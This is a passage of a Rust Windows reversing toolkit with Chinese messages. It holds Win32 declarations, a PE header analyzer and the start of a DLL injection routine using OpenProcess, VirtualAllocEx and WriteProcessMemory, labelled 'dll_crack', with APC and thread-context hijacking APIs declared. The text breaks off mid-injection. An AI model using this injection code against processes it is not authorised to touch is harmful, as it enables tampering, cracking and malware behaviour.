        pub fn Process32Next(h_snapshot: HANDLE, lppe: *mut PROCESSENTRY32) -> BOOL;
        pub fn Module32First(h_snapshot: HANDLE, lpme: *mut MODULEENTRY32) -> BOOL;
        pub fn Module32Next(h_snapshot: HANDLE, lpme: *mut MODULEENTRY32) -> BOOL;
        pub fn Thread32First(h_snapshot: HANDLE, lpte: *mut THREADENTRY32) -> BOOL;
        pub fn Thread32Next(h_snapshot: HANDLE, lpte: *mut THREADENTRY32) -> BOOL;
        pub fn GetCurrentProcessId() -> DWORD;
        pub fn GetLastError() -> DWORD;
        pub fn SuspendThread(h_thread: HANDLE) -> DWORD;
        pub fn ResumeThread(h_thread: HANDLE) -> DWORD;
        pub fn OpenThread(dw_desired_access: DWORD, b_inherit_handle: BOOL, dw_thread_id: DWORD) -> HANDLE;
        pub fn QueueUserAPC(pfn_apc: FARPROC, h_thread: HANDLE, dw_data: ULONG_PTR) -> DWORD;
        pub fn Sleep(dw_milliseconds: DWORD);
        pub fn GetCurrentThreadId() -> DWORD;
        pub fn NtWriteVirtualMemory(process_handle: HANDLE, base_address: LPVOID, buffer: LPVOID, number_of_bytes_to_write: SIZE_T, number_of_bytes_written: *mut SIZE_T) -> LONG;
        // v4.1 injection additions
        pub fn CreateProcessA(lp_application_name: LPCSTR, lp_command_line: *mut u8, lp_process_attributes: LPVOID, lp_thread_attributes: LPVOID, b_inherit_handles: BOOL, dw_creation_flags: DWORD, lp_environment: LPVOID, lp_current_directory: LPCSTR, lp_startup_info: *mut STARTUPINFOA, lp_process_information: *mut PROCESS_INFORMATION) -> BOOL;
        pub fn TerminateProcess(h_process: HANDLE, u_exit_code: u32) -> BOOL;
        pub fn IsWow64Process(h_process: HANDLE, wow64_process: *mut i32) -> BOOL;
        pub fn GetThreadContext(h_thread: HANDLE, lp_context: *mut c_void) -> BOOL;
        pub fn SetThreadContext(h_thread: HANDLE, lp_context: *const c_void) -> BOOL;
        pub fn SetWindowsHookExA(id_hook: i32, lpfn: FARPROC, h_mod: HMODULE, dw_thread_id: DWORD) -> *mut c_void;
        pub fn UnhookWindowsHookEx(hhk: *mut c_void) -> BOOL;
        pub fn FreeLibrary(h_lib_module: HMODULE) -> BOOL;
    }

    #[repr(C)] pub struct STARTUPINFOA {
        pub cb: DWORD, pub lp_reserved: *mut u8, pub lp_desktop: *mut u8, pub lp_title: *mut u8,
        pub dw_x: DWORD, pub dw_y: DWORD, pub dw_x_size: DWORD, pub dw_y_size: DWORD,
        pub dw_x_count_chars: DWORD, pub dw_y_count_chars: DWORD, pub dw_fill_attribute: DWORD,
        pub dw_flags: DWORD, pub w_show_window: u16, pub cb_reserved2: u16,
        pub lp_reserved2: *mut u8, pub h_std_input: HANDLE, pub h_std_output: HANDLE,
        pub h_std_error: HANDLE,
    }

    #[repr(C)] pub struct PROCESS_INFORMATION {
        pub hProcess: HANDLE, pub hThread: HANDLE, pub dwProcessId: DWORD, pub dwThreadId: DWORD,
    }

    // x64 context (simplified)
    #[repr(C)] pub struct CONTEXT64 {
        pub P1Home: u64, pub P2Home: u64, pub P3Home: u64, pub P4Home: u64,
        pub P5Home: u64, pub P6Home: u64,
        pub ContextFlags: u32, pub MxCsr: u32,
        pub SegCs: u16, pub SegDs: u16, pub SegEs: u16, pub SegFs: u16, pub SegGs: u16, pub SegSs: u16,
        pub EFlags: u32,
        pub Dr0: u64, pub Dr1: u64, pub Dr2: u64, pub Dr3: u64, pub Dr6: u64, pub Dr7: u64,
        pub Rax: u64, pub Rcx: u64, pub Rdx: u64, pub Rbx: u64,
        pub Rsp: u64, pub Rbp: u64, pub Rsi: u64, pub Rdi: u64,
        pub R8: u64, pub R9: u64, pub R10: u64, pub R11: u64,
        pub R12: u64, pub R13: u64, pub R14: u64, pub R15: u64,
        pub Rip: u64,
        // ... float/extended state omitted for simplicity
    }

    #[repr(C)] pub struct CONTEXT32 {
        pub ContextFlags: u32,
        pub Dr0: u32, pub Dr1: u32, pub Dr2: u32, pub Dr3: u32, pub Dr6: u32, pub Dr7: u32,
        pub FloatSave: [u32; 28],
        pub SegGs: u32, pub SegFs: u32, pub SegEs: u32, pub SegDs: u32,
        pub Edi: u32, pub Esi: u32, pub Ebx: u32, pub Edx: u32,
        pub Ecx: u32, pub Eax: u32,
        pub Ebp: u32, pub Eip: u32,
        pub SegCs: u32, pub EFlags: u32, pub Esp: u32, pub SegSs: u32,
    }
}

use win32::*;

fn w32_err() -> String { format!("Win32错误码: {}", unsafe { GetLastError() }) }

fn find_pid(name_hint: &str) -> Result<u32, String> {
    let h = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    if h == INVALID_HANDLE_VALUE { return Err(w32_err()); }
    let mut pe: PROCESSENTRY32 = unsafe { std::mem::zeroed() };
    pe.dw_size = std::mem::size_of::<PROCESSENTRY32>() as u32;
    unsafe { Process32First(h, &mut pe); }
    loop {
        let name = String::from_utf8_lossy(&pe.sz_exe_file[..pe.sz_exe_file.iter().position(|&b| b==0).unwrap_or(260)]);
        let pid_str = pe.th32_process_id.to_string();
        if name.to_lowercase().contains(&name_hint.to_lowercase()) || pid_str == name_hint {
            unsafe { CloseHandle(h); }
            return Ok(pe.th32_process_id);
        }
        if unsafe { Process32Next(h, &mut pe) } == 0 { break; }
    }
    unsafe { CloseHandle(h); }
    Err(format!("未找到进程: {}", name_hint))
}

fn find_module_info(pid: u32, module_hint: &str) -> Result<(*mut u8, u32, String), String> {
    let h_snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid) };
    if h_snap == INVALID_HANDLE_VALUE { return Err(w32_err()); }
    let mut me: MODULEENTRY32 = unsafe { std::mem::zeroed() };
    me.dw_size = std::mem::size_of::<MODULEENTRY32>() as u32;
    unsafe { Module32First(h_snap, &mut me); }
    loop {
        let name = String::from_utf8_lossy(&me.sz_module[..me.sz_module.iter().position(|&b| b==0).unwrap_or(256)]);
        if name.to_lowercase().contains(&module_hint.to_lowercase()) {
            let path = String::from_utf8_lossy(&me.sz_exe_path[..me.sz_exe_path.iter().position(|&b| b==0).unwrap_or(260)]).to_string();
            let r = (me.mod_base_addr, me.mod_base_size, path);
            unsafe { CloseHandle(h_snap); }
            return Ok(r);
        }
        if unsafe { Module32Next(h_snap, &mut me) } == 0 { break; }
    }
    unsafe { CloseHandle(h_snap); }
    Err(format!("未在进程 {} 中找到模块: {}", pid, module_hint))
}

// ═══════════════ PE 分析器 v2.0 (TLS/重定位/CLR/安全检查) ═══════════════

fn pe_analyze(path: &str, verbose: bool) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("无法读取文件: {}", e))?;
    if data.len() < 64 { return Err("文件太小,不是有效PE".into()); }

    let dos_magic = u16_le(&data, 0);
    if dos_magic != 0x5A4D { return Err(format!("非MZ头: 0x{:04X}", dos_magic)); }
    let pe_offset = u32_le(&data, 0x3C) as usize;
    if pe_offset + 4 > data.len() { return Err("PE偏移越界".into()); }
    if u32_le(&data, pe_offset) != 0x4550 { return Err(format!("非PE签名: 0x{:08X}", u32_le(&data, pe_offset))); }

    let coff = pe_offset + 4;
    let machine = u16_le(&data, coff);
    let num_sections = u16_le(&data, coff + 2) as usize;
    let time_date = u32_le(&data, coff + 4);
    let size_of_opt_header = u16_le(&data, coff + 16) as usize;
    let characteristics = u16_le(&data, coff + 18);

    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let entry_va = if is_x64 { u64_le(&data, opt_start + 16) } else { u32_le(&data, opt_start + 16) as u64 };
    let image_base = if is_x64 { u64_le(&data, opt_start + 24) } else { u32_le(&data, opt_start + 28) as u64 };
    let section_align = u32_le(&data, opt_start + 32);
    let file_align = u32_le(&data, opt_start + 36);
    let image_size = u32_le(&data, opt_start + 56);
    let headers_size = u32_le(&data, opt_start + 60);
    let subsystem = u16_le(&data, opt_start + 68);
    let dll_chars = u16_le(&data, opt_start + 70);
    let stack_reserve = if is_x64 { u64_le(&data, opt_start + 72) } else { u32_le(&data, opt_start + 72) as u64 };
    let stack_commit = if is_x64 { u64_le(&data, opt_start + 80) } else { u32_le(&data, opt_start + 76) as u64 };
    let heap_reserve = if is_x64 { u64_le(&data, opt_start + 88) } else { u32_le(&data, opt_start + 80) as u64 };
    let heap_commit = if is_x64 { u64_le(&data, opt_start + 96) } else { u32_le(&data, opt_start + 84) as u64 };

    // Data directories
    let dd_start = opt_start + if is_x64 { 112 } else { 96 };
    let num_dd = u32_le(&data, opt_start + if is_x64 { 108 } else { 92 }) as usize;
    let export_rva = u32_le(&data, dd_start);     let export_size = u32_le(&data, dd_start + 4);
    let import_rva = u32_le(&data, dd_start + 8);  let import_size = u32_le(&data, dd_start + 12);
    let resource_rva = u32_le(&data, dd_start + 16); let resource_size = u32_le(&data, dd_start + 20);
    let exception_rva = u32_le(&data, dd_start + 24); let exception_size = u32_le(&data, dd_start + 28);
    let security_rva = u32_le(&data, dd_start + 32); let security_size = u32_le(&data, dd_start + 36);
    let basereloc_rva = u32_le(&data, dd_start + 40); let basereloc_size = u32_le(&data, dd_start + 44);
    let debug_rva = u32_le(&data, dd_start + 48); let debug_size = u32_le(&data, dd_start + 52);
    let tls_rva = u32_le(&data, dd_start + 72); let tls_size = u32_le(&data, dd_start + 76);
    let load_config_rva = u32_le(&data, dd_start + 80); let load_config_size = u32_le(&data, dd_start + 84);
    let iat_rva = u32_le(&data, dd_start + 96); let iat_size = u32_le(&data, dd_start + 100);
    // CLR header (directory index 14)
    let clr_rva = if dd_start + 14*8 + 4 <= data.len() { u32_le(&data, dd_start + 14*8) } else { 0 };
    let clr_size = if dd_start + 14*8 + 4 <= data.len() { u32_le(&data, dd_start + 14*8 + 4) } else { 0 };

    let section_start = coff + 20 + size_of_opt_header;
    let mut sections = Vec::new();
    for i in 0..num_sections {
        let off = section_start + i * 40;
        let name = String::from_utf8_lossy(&data[off..off+8]).trim_end_matches('\0').to_string();
        let vsize = u32_le(&data, off + 8);
        let vaddr = u32_le(&data, off + 12);
        let rsize = u32_le(&data, off + 16);
        let roff = u32_le(&data, off + 20);
        let chars = u32_le(&data, off + 36);
        sections.push((name, vaddr, vsize, roff, rsize, chars));
    }

    fn rva_to_offset(rva: u32, sections: &[(String,u32,u32,u32,u32,u32)]) -> Option<usize> {
        for &(_, vaddr, vsize, roff, rsize, _) in sections {
            if rva >= vaddr && rva < vaddr + vsize.max(rsize) {
                return if rsize > 0 { Some((roff + (rva - vaddr)) as usize) } else { None };
            }
        }
        None
    }

    let mut out = String::new();
    out.push_str(&format!("═══ PE 深度分析: {} ═══\n\n", path));
    out.push_str(&format!("[·] 架构: {}\n", if is_x64 {"x64 (PE32+)"} else {"x86 (PE32)"}));
    out.push_str(&format!("[·] 编译时间: {}\n", unix_to_str(time_date)));
    let mach_str = match machine { 0x14C => "i386", 0x8664 => "AMD64", 0x1C0 => "ARM", 0xAA64 => "ARM64", 0x200 => "IA64", _ => "未知" };
    out.push_str(&format!("[·] 目标平台: {} (0x{:04X})\n", mach_str, machine));
    let mut ch_flags = Vec::new();
    if characteristics & 0x0002 != 0 { ch_flags.push("EXECUTABLE"); }
    if characteristics & 0x2000 != 0 { ch_flags.push("DLL"); }
    if characteristics & 0x0100 != 0 { ch_flags.push("32BIT"); }
    if characteristics & 0x0020 != 0 { ch_flags.push("LARGE_ADDRESS"); }
    if characteristics & 0x0001 != 0 { ch_flags.push("RELOCS_STRIPPED"); }
    if characteristics & 0x0004 != 0 { ch_flags.push("LINE_NUMS_STRIPPED"); }
    if characteristics & 0x0008 != 0 { ch_flags.push("LOCAL_SYMS_STRIPPED"); }
    out.push_str(&format!("[·] 类型: {}\n", ch_flags.join(" | ")));
    out.push_str(&format!("[·] 入口点: 0x{:016X}\n", entry_va));
    out.push_str(&format!("[·] 镜像基址: 0x{:016X}\n", image_base));
    out.push_str(&format!("[·] 镜像大小: {} KB\n", image_size / 1024));
    out.push_str(&format!("[·] 头大小: {} / 节对齐: {} / 文件对齐: {}\n", headers_size, section_align, file_align));
    out.push_str(&format!("[·] 子系统: {}\n", match subsystem {
        1 => "NATIVE", 2 => "WINDOWS_GUI", 3 => "WINDOWS_CONSOLE", 5 => "OS2_CONSOLE",
        7 => "POSIX_CONSOLE", 9 => "WINDOWS_CE_GUI", 10 => "EFI_APPLICATION",
        11 => "EFI_BOOT_SERVICE", 12 => "EFI_RUNTIME", _ => "未知"
    }));

    // 安全检查
    out.push_str("\n─── 安全特性 ───\n");
    if dll_chars & 0x0100 != 0 { out.push_str("[+] NX_COMPAT (DEP) 已启用\n"); } else { out.push_str("[!] NX_COMPAT (DEP) 未启用 — 可执行栈!\n"); }
    if dll_chars & 0x0040 != 0 { out.push_str("[+] DYNAMIC_BASE (ASLR) 已启用\n"); } else { out.push_str("[!] DYNAMIC_BASE (ASLR) 未启用 — 固定基址!\n"); }
    if dll_chars & 0x0008 != 0 { out.push_str("[+] FORCE_INTEGRITY (签名强制) 已启用\n"); }
    if dll_chars & 0x0200 != 0 { out.push_str("[+] NO_SEH (SafeSEH) 已启用\n"); }
    if dll_chars & 0x8000 != 0 { out.push_str("[+] CET_COMPAT (Intel CET) 已启用\n"); }
    if dll_chars & 0x4000 != 0 { out.push_str("[+] GUARD_CF (CFG) 已启用\n"); }
    if dll_chars & 0x1000 != 0 { out.push_str("[+] HIGH_ENTROPY_VA (64位ASLR) 已启用\n"); }

    // Stack/Heap
    out.push_str(&format!("\n─── 内存配置 ───\n"));
    out.push_str(&format!("[·] 栈保留: {} MB / 初始提交: {} KB\n", stack_reserve/1024/1024, stack_commit/1024));
    out.push_str(&format!("[·] 堆保留: {} MB / 初始提交: {} KB\n", heap_reserve/1024/1024, heap_commit/1024));

    // LoadConfig (安全cookie/SEH/CFG)
    if load_config_rva > 0 && load_config_size > 0 {
        if let Some(lc_off) = rva_to_offset(load_config_rva, &sections) {
            out.push_str("\n─── LoadConfig 安全信息 ───\n");
            if lc_off + 64 <= data.len() {
                let sec_cookie = if is_x64 { u64_le(&data, lc_off + 48) } else { u32_le(&data, lc_off + 48) as u64 };
                out.push_str(&format!("[·] Security Cookie: 0x{:016X}\n", sec_cookie));
            }
            if lc_off + 100 <= data.len() && is_x64 {
                let guard_cf = u64_le(&data, lc_off + 80);
                if guard_cf != 0 { out.push_str(&format!("[+] CFG Check Function: 0x{:016X}\n", guard_cf)); }
                let guard_cf_dispatch = u64_le(&data, lc_off + 88);
                if guard_cf_dispatch != 0 { out.push_str(&format!("[+] CFG Dispatch: 0x{:016X}\n", guard_cf_dispatch)); }
            }
        }
    }

    // Sections
    out.push_str(&format!("\n─── 节表 ({} 个节) ───\n", num_sections));
    for (name, vaddr, vsize, roff, rsize, chars) in &sections {
        let mut perm = String::new();
        if chars & 0x20000000 != 0 { perm.push('X'); }
        if chars & 0x40000000 != 0 { perm.push('R'); }
        if chars & 0x80000000 != 0 { perm.push('W'); }
        if chars & 0x02000000 != 0 { perm.push('D'); } // discardable
        if chars & 0x10000000 != 0 { perm.push('S'); } // shared
        let ratio = if *vsize > 0 { (*rsize as f64 / *vsize as f64 * 100.0) as u32 } else { 0 };
        out.push_str(&format!("  {:<8}  VA:0x{:08X}  VSz:{:8}  ROff:0x{:08X}  RSz:{:8}  ({:3}%) [{}]\n",
            name, vaddr, vsize, roff, rsize, ratio, perm));
    }

    // Exports
    if export_rva > 0 && export_size > 0 {
        if let Some(exp_off) = rva_to_offset(export_rva, &sections) {
            if let Ok(exports) = parse_exports(&data, exp_off, &sections) {
                out.push_str(&format!("\n─── 导出表 ({} 个函数) ───\n", exports.1.len()));
                out.push_str(&format!("[·] DLL名称: {}\n", exports.0));
                let show = if exports.1.len() > 30 { &exports.1[..30] } else { &exports.1[..] };
                for (ord, name) in show {
                    out.push_str(&format!("  {:4}  {}\n", ord, name));
                }
                if exports.1.len() > 30 { out.push_str(&format!("  ... 还有 {} 个\n", exports.1.len()-30)); }
            }
        }
    }

    // Imports
    if import_rva > 0 && import_size > 0 {
        if let Some(imp_off) = rva_to_offset(import_rva, &sections) {
            if let Ok(imports) = parse_imports(&data, imp_off, &sections) {
                let total_funcs: usize = imports.iter().map(|(_, f)| f.len()).sum();
                out.push_str(&format!("\n─── 导入表 ({} DLLs, {} 函数) ───\n", imports.len(), total_funcs));
                for (dll_name, funcs) in &imports {
                    out.push_str(&format!("  [{}] ({})\n", dll_name, funcs.len()));
                    let show = if funcs.len() > 10 { &funcs[..10] } else { &funcs[..] };
                    for f in show { out.push_str(&format!("    - {}\n", f)); }
                    if funcs.len() > 10 { out.push_str(&format!("    ... 还有 {} 个\n", funcs.len()-10)); }
                }
            }
        }
    }

    // TLS Callbacks (NEW v2.0)
    if tls_rva > 0 && tls_size > 0 {
        if let Some(tls_off) = rva_to_offset(tls_rva, &sections) {
            out.push_str("\n─── TLS 回调 ⚠ ───\n");
            if let Ok(callbacks) = parse_tls(&data, tls_off, is_x64, &sections) {
                if callbacks.is_empty() {
                    out.push_str("[·] 无TLS回调\n");
                } else {
                    for (i, cb) in callbacks.iter().enumerate() {
                        out.push_str(&format!("  [!] TLS回调[{}]: 0x{:016X}\n", i, cb));
                    }
                    out.push_str("[!] TLS回调常用于反调试/反VM — 注意!\n");
                }
            }
        }
    }

    // 重定位 (NEW v2.0)
    if basereloc_rva > 0 && basereloc_size > 0 {
        out.push_str(&format!("\n─── 基址重定位 ───\n"));
        out.push_str(&format!("[·] 重定位表: RVA=0x{:08X} 大小={}KB\n", basereloc_rva, basereloc_size/1024));
        if let Some(reloc_off) = rva_to_offset(basereloc_rva, &sections) {
            let block_count = count_reloc_blocks(&data, reloc_off, basereloc_size as usize);
            out.push_str(&format!("[·] 重定位块: ~{} 个\n", block_count));
        }
    }

    // CLR / .NET (NEW v2.0)
    if clr_rva > 0 && clr_size > 0 {
        out.push_str("\n─── .NET CLR 头 ───\n");
        out.push_str(&format!("[+] 检测到.NET程序集! CLR头: RVA=0x{:08X} 大小={}B\n", clr_rva, clr_size));
        if let Some(clr_off) = rva_to_offset(clr_rva, &sections) {
            if let Ok(info) = parse_clr(&data, clr_off) {
                out.push_str(&info);
            }
        }
    }

    // Resources
    if resource_rva > 0 && resource_size > 0 {
        out.push_str(&format!("\n[·] 资源段: RVA=0x{:08X} 大小={}KB\n", resource_rva, resource_size/1024));
    }

    // Exception table
    if exception_rva > 0 && exception_size > 0 {
        out.push_str(&format!("[·] 异常表: RVA=0x{:08X} 大小={}B ({:.1}KB)\n", exception_rva, exception_size, exception_size as f64/1024.0));
    }

    // Security (数字签名)
    if security_rva > 0 && security_size > 0 {
        out.push_str(&format!("[·] 数字签名: 偏移=0x{:08X} 大小={}KB (存在于文件中)\n", security_rva, security_size/1024));
    }

    // Debug
    if debug_rva > 0 && debug_size > 0 {
        if let Some(dbg_off) = rva_to_offset(debug_rva, &sections) {
            if dbg_off + 4 <= data.len() {
                let dbg_type = u32_le(&data, dbg_off + 12);
                let dbg_type_str = match dbg_type { 1 => "COFF", 2 => "CODEVIEW", 3 => "FPO", 4 => "MISC", 5 => "EXCEPTION", 6 => "FIXUP", 10 => "BORLAND", _ => "未知" };
                out.push_str(&format!("[·] 调试信息: 类型={} ({})\n", dbg_type_str, dbg_type));
            }
        }
    }

    if verbose {
        // IAT 独立检查
        if iat_rva > 0 && iat_size > 0 {
            out.push_str(&format!("\n[·] 独立IAT: RVA=0x{:08X} 大小={}B (绑定导入?)\n", iat_rva, iat_size));
        }
        // Data directory 数量
        out.push_str(&format!("\n[·] 数据目录项: {} 个\n", num_dd.min(16)));
    }

    Ok(out)
}

// TLS 回调解析
fn parse_tls(data: &[u8], off: usize, is_x64: bool, sections: &[(String,u32,u32,u32,u32,u32)]) -> Result<Vec<u64>, String> {
    let mut callbacks = Vec::new();
    // TLS directory: StartAddressOfRawData / EndAddressOfRawData / AddressOfIndex / AddressOfCallBacks
    let cb_rva = if is_x64 { u64_le(data, off + 24) } else { u32_le(data, off + 12) as u64 };
    if cb_rva == 0 { return Ok(callbacks); }

    fn rva_to_off(rva: u32, secs: &[(String,u32,u32,u32,u32,u32)]) -> Option<usize> {
        for &(_, va, vs, ro, rs, _) in secs {
            if rva >= va && rva < va + vs.max(rs) && rs > 0 {
                return Some((ro + (rva - va)) as usize);
            }
        }
        None
    }

    if let Some(cb_off) = rva_to_off(cb_rva as u32, sections) {
        for i in 0..32 { // 最多32个回调
            let ptr_off = cb_off + i * if is_x64 { 8 } else { 4 };
            if ptr_off + 8 > data.len() { break; }
            let addr = if is_x64 { u64_le(data, ptr_off) } else { u32_le(data, ptr_off) as u64 };
            if addr == 0 { break; }
            callbacks.push(addr);
        }
    }
    Ok(callbacks)
}

// 重定位块计数
fn count_reloc_blocks(data: &[u8], mut off: usize, max_size: usize) -> usize {
    let end = (off + max_size).min(data.len());
    let mut count = 0;
    while off + 8 <= end {
        let _page_rva = u32_le(data, off);
        let block_size = u32_le(data, off + 4);
        if block_size == 0 { break; }
        count += 1;
        off += block_size as usize;
    }
    count
}

// CLR 头解析
fn parse_clr(data: &[u8], off: usize) -> Result<String, String> {
    if off + 8 > data.len() { return Err("CLR头越界".into()); }
    let cb = u32_le(data, off);
    if cb < 8 { return Err("CLR头太小".into()); }
    let mut out = String::new();
    if off + 16 <= data.len() {
        let rt_ver = u16_le(data, off + 4);
        let meta_rva = u32_le(data, off + 8);
        let meta_size = u32_le(data, off + 12);
        let flags = u32_le(data, off + 16);
        out.push_str(&format!("[·] 运行时版本: v{}.{}\n", rt_ver >> 8, rt_ver & 0xFF));
        out.push_str(&format!("[·] 元数据: RVA=0x{:08X} 大小={}B\n", meta_rva, meta_size));
        let mut flag_strs = Vec::new();
        if flags & 0x01 != 0 { flag_strs.push("ILONLY"); }
        if flags & 0x02 != 0 { flag_strs.push("32BITREQUIRED"); }
        if flags & 0x04 != 0 { flag_strs.push("STRONGNAMESIGNED"); }
        if flags & 0x08 != 0 { flag_strs.push("NATIVE_ENTRYPOINT"); }
        if flags & 0x10 != 0 { flag_strs.push("TRACKDEBUGDATA"); }
        if flags & 0x20 != 0 { flag_strs.push("32BITPREFERRED"); }
        out.push_str(&format!("[·] 标志: {}\n", flag_strs.join(" | ")));
    }
    Ok(out)
}

// ═══════════════ PE 辅助函数 ═══════════════

fn parse_exports(data: &[u8], offset: usize, sections: &[(String,u32,u32,u32,u32,u32)]) -> Result<(String, Vec<(u16, String)>), String> {
    if offset + 40 > data.len() { return Err("导出表越界".into()); }
    let name_rva = u32_le(data, offset + 12);
    let ordinal_base = u32_le(data, offset + 16) as u16;
    let _num_funcs = u32_le(data, offset + 20) as usize;
    let num_names = u32_le(data, offset + 24) as usize;
    let _funcs_rva = u32_le(data, offset + 28);
    let names_rva = u32_le(data, offset + 32);
    let ords_rva = u32_le(data, offset + 36);

    fn rva_to_off(rva: u32, sections: &[(String,u32,u32,u32,u32,u32)]) -> usize {
        for &(_, vaddr, vsize, roff, rsize, _) in sections {
            if rva >= vaddr && rva < vaddr + vsize.max(rsize) && rsize > 0 {
                return (roff + (rva - vaddr)) as usize;
            }
        }
        rva as usize
    }

    let dll_name = if name_rva == 0 { "未知".to_string() } else {
        let o = rva_to_off(name_rva, sections);
        if o < data.len() {
            let end = data[o..].iter().position(|&b| b==0).map(|i| o+i).unwrap_or(data.len());
            String::from_utf8_lossy(&data[o..end.min(data.len())]).to_string()
        } else { "OOB".into() }
    };

    let mut exports = Vec::new();
    let names_off = rva_to_off(names_rva, sections);
    let ords_off = rva_to_off(ords_rva, sections);
    for i in 0..num_names.min(2000) {
        if names_off + i*4 + 4 > data.len() { break; }
        if ords_off + i*2 + 2 > data.len() { break; }
        let name_rva_val = u32_le(data, names_off + i*4);
        let ord_idx = u16_le(data, ords_off + i*2);
        let ordinal = ordinal_base + ord_idx;
        let name = if name_rva_val > 0 {
            let start = rva_to_off(name_rva_val, sections);
            if start < data.len() {
                let end = data[start..].iter().position(|&b| b==0).map(|p| start+p).unwrap_or(data.len());
                String::from_utf8_lossy(&data[start..end.min(data.len())]).to_string()
            } else { format!("Ordinal_{}", ordinal) }
        } else { format!("Ordinal_{}", ordinal) };
        if !name.is_empty() { exports.push((ordinal, name)); }
    }
    Ok((dll_name, exports))
}

fn parse_imports(data: &[u8], offset: usize, sections: &[(String,u32,u32,u32,u32,u32)]) -> Result<Vec<(String, Vec<String>)>, String> {
    fn rva_to_off(rva: u32, sections: &[(String,u32,u32,u32,u32,u32)]) -> usize {
        for &(_, vaddr, vsize, roff, rsize, _) in sections {
            if rva >= vaddr && rva < vaddr + vsize.max(rsize) && rsize > 0 {
                return (roff + (rva - vaddr)) as usize;
            }
        }
        rva as usize
    }

    let mut imports = Vec::new();
    let mut i = 0;
    loop {
        let off = offset + i * 20;
        if off + 20 > data.len() { break; }
        let name_rva = u32_le(data, off + 12);
        if name_rva == 0 { break; }
        let iat_rva = u32_le(data, off);

        let dll_name = {
            let o = rva_to_off(name_rva, sections);
            if o < data.len() {
                let end = data[o..].iter().position(|&b| b==0).map(|j| o+j).unwrap_or(data.len());
                String::from_utf8_lossy(&data[o..end.min(data.len())]).to_string()
            } else { break; }
        };

        let mut funcs = Vec::new();
        if let Some(iat_off) = {
            let iat_off = rva_to_off(iat_rva, sections);
            if iat_off < data.len() { Some(iat_off) } else { None }
        } {
            let mut j = 0;
            while iat_off + j*8 + 8 <= data.len() {
                let nf = u32_le(data, iat_off + j*8 + 4);
                let name_rva_field = if nf == 0 { u32_le(data, iat_off + j*8) } else { nf };
                if name_rva_field == 0 { break; }
                if name_rva_field & 0x80000000 != 0 {
                    funcs.push(format!("Ord(0x{:04X})", name_rva_field & 0x7FFF));
                } else {
                    let no = rva_to_off(name_rva_field, sections);
                    if no + 2 < data.len() {
                        let name = String::from_utf8_lossy(&data[no+2..data[no+2..].iter().position(|&b| b==0).map(|p| no+2+p).unwrap_or(data.len())]).to_string();
                        funcs.push(name);
                    }
                }
                j += 1;
            }
        }
        imports.push((dll_name, funcs));
        i += 1;
    }
    Ok(imports)
}

fn u16_le(d: &[u8], off: usize) -> u16 { u16::from_le_bytes([d[off], d[off+1]]) }
fn u32_le(d: &[u8], off: usize) -> u32 { u32::from_le_bytes([d[off], d[off+1], d[off+2], d[off+3]]) }
fn u64_le(d: &[u8], off: usize) -> u64 { u64::from_le_bytes([d[off],d[off+1],d[off+2],d[off+3],d[off+4],d[off+5],d[off+6],d[off+7]]) }

fn unix_to_str(ts: u32) -> String {
    let secs = ts as i64;
    let days = secs / 86400;
    let years = 1970 + days / 365;
    let rem = days % 365;
    let months = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
    let month_days = [31,28,31,30,31,30,31,31,30,31,30,31];
    let mut m = 0; let mut d = rem;
    for (i, &md) in month_days.iter().enumerate() { if d >= md { d -= md; m = i+1; } else { m = i; break; } }
    if m >= 12 { m = 11; }
    let h = (secs % 86400) / 3600;
    let min = (secs % 3600) / 60;
    let s = secs % 60;
    format!("{:02} {} {} {:02}:{:02}:{:02}", d+1, months[m], years, h, min, s)
}

fn hex_to_bytes(hex_str: &str) -> Result<Vec<u8>, String> {
    let clean = hex_str.replace(" ", "").replace("0x", "").replace("0X", "").replace(",", "");
    if clean.len() % 2 != 0 { return Err("HEX长度必须为偶数".into()); }
    let mut bytes = Vec::new();
    for i in (0..clean.len()).step_by(2) {
        bytes.push(u8::from_str_radix(&clean[i..i+2], 16).map_err(|e| format!("HEX解析失败: {}", e))?);
    }
    Ok(bytes)
}

fn parse_offset(offset_str: &str) -> Result<usize, String> {
    if offset_str.starts_with("0x") || offset_str.starts_with("0X") {
        usize::from_str_radix(&offset_str[2..], 16).map_err(|e| format!("偏移解析: {}", e))
    } else {
        offset_str.parse::<usize>().map_err(|e| format!("偏移解析: {}", e))
    }
}

// ═══════════════ DLL 注入 v2.0 (CreateRemoteThread + APC) ═══════════════

fn dll_inject_cmd(pid_str: &str, dll_path: &str, method: &str) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok())
        .ok_or_else(|| format!("无效PID: {}", pid_str))?;

    let dll_abs = std::fs::canonicalize(dll_path).map_err(|e| format!("DLL路径无效: {}", e))?;
    let dll_str = dll_abs.to_string_lossy().to_string();
    if !std::path::Path::new(&dll_str).exists() { return Err(format!("DLL不存在: {}", dll_str)); }

    msg_tagged("dll_inject_status", &format!("[*] 目标PID: {} | DLL: {} | 方法: {}", pid, dll_str, method));

    match method {
        "apc" => inject_apc(pid, &dll_str),
        _ => inject_crt(pid, &dll_str),
    }
}

fn inject_crt(pid: u32, dll_str: &str) -> Result<String, String> {
    let pbar = progress_create("dll_crack", "inject_crt", "DLL注入(CRT)", 5);

    progress_update(&pbar, 1, "打开目标进程...");
    let h_proc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程 {}: {}", pid, w32_err()));
    }

    progress_update(&pbar, 2, "分配远程内存...");
    let dll_bytes = dll_str.as_bytes();
    let dll_len = dll_bytes.len() + 1;
    let remote_mem = unsafe { VirtualAllocEx(h_proc, std::ptr::null_mut(), dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) };
    if remote_mem.is_null() { unsafe { CloseHandle(h_proc); } return Err(format!("VirtualAllocEx: {}", w32_err())); }

    progress_update(&pbar, 3, "写入DLL路径...");
    let mut written: usize = 0;
    let ret = unsafe { WriteProcessMemory(h_proc, remote_mem, dll_bytes.as_ptr() as LPVOID, dll_bytes.len(), &mut written) };
    if ret == 0 || written != dll_bytes.len() {
